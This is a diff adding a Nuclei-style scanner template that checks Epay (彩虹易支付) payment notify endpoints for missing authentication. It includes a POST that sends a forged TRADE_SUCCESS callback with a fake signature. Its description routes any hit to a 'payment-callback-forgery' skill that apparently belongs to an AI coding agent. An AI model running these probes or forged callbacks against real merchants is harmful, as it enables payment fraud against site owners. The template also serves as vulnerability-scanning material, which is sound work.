@@ -1,0 +1,58 @@
+id: epay-notify-unauth
+
+info:
+  name: Epay / 彩虹易支付 notify 未鉴权
+  author: survey-engine
+  severity: critical
+  description: >
+    检测 Epay/彩虹易支付 /notify.php 或 /pay/notify 是否无鉴权直接处理。
+    命中后走 .cursor/skills/payment-callback-forgery 验签矩阵。
+  tags: epay,payment,notify,callback,unauth
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/notify.php"
+      - "{{BaseURL}}/pay/notify"
+      - "{{BaseURL}}/api/pay/notify"
+      - "{{BaseURL}}/index/pay/notify"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "订单号"
+          - "sign error"
+          - "sign_error"
+          - "param error"
+          - "FAIL"
+          - "SUCCESS"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - '"code"'
+          - '"trade_no"'
+          - '"out_trade_no"'
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/notify.php"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "trade_no=TEST&out_trade_no=TEST&type=1&name=test&money=0.01&trade_status=TRADE_SUCCESS&sign=fake&sign_type=MD5"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sign error"
+          - "FAIL"
+          - "success"
+          - "订单"
+        condition: or
